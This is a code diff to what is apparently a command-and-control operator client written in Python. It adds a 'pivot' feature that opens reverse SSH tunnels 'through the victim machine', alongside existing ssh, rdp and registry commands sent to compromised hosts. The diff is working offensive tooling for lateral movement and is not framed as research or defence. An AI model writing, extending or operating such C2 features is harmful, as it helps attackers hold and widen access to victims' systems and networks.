@@ -213,6 +213,11 @@ Commands:
   ssh list
   ssh disconnect <session_id>
 
+  --- PIVOT (reverse SSH tunnel via victim) ---
+  pivot open   <target_host> <target_port> <your_ssh_user> [password]
+  pivot stop   <session_id>
+  pivot list
+
   --- RDP ---
   rdp probe <host> [port]
   rdp open  <host> <user> [port] [password]
@@ -307,6 +312,35 @@ def parse_ssh(parts: list[str], client: C2Client):
         pprint(client.send("ssh", {"action": "disconnect", "session_id": parts[1]}))
     else:
         print(f"Unknown ssh action: {action!r}")
+
+
+def parse_pivot(parts: list[str], client: C2Client):
+    """Open/stop/list reverse SSH tunnels through the victim machine."""
+    if not parts:
+        print("Usage: pivot <open|stop|list> ...")
+        return
+    action = parts[0]
+    if action == "open":
+        if len(parts) < 4:
+            print("Usage: pivot open <target_host> <target_port> <your_ssh_user> [password]")
+            return
+        host     = parts[1]
+        port     = int(parts[2])
+        username = parts[3]
+        password = parts[4] if len(parts) > 4 else ""
+        payload  = {"action": "open", "host": host, "port": port,
+                    "username": username, "password": password,
+                    "session_id": f"{host}:{port}"}
+        pprint(client.send("pivot", payload))
+    elif action == "stop":
+        if len(parts) < 2:
+            print("Usage: pivot stop <session_id>")
+            return
+        pprint(client.send("pivot", {"action": "stop", "session_id": parts[1]}))
+    elif action == "list":
+        pprint(client.send("pivot", {"action": "list"}))
+    else:
+        print(f"Unknown pivot action: {action!r}. Valid: open, stop, list")
 
 
 def parse_rdp(parts: list[str], client: C2Client):
@@ -726,6 +760,8 @@ def repl(client: C2Client):
             print(HELP_TEXT)
         elif cmd == "ssh":
             parse_ssh(parts[1:], client)
+        elif cmd == "pivot":
+            parse_pivot(parts[1:], client)
         elif cmd == "rdp":
             parse_rdp(parts[1:], client)
         elif cmd == "reg":
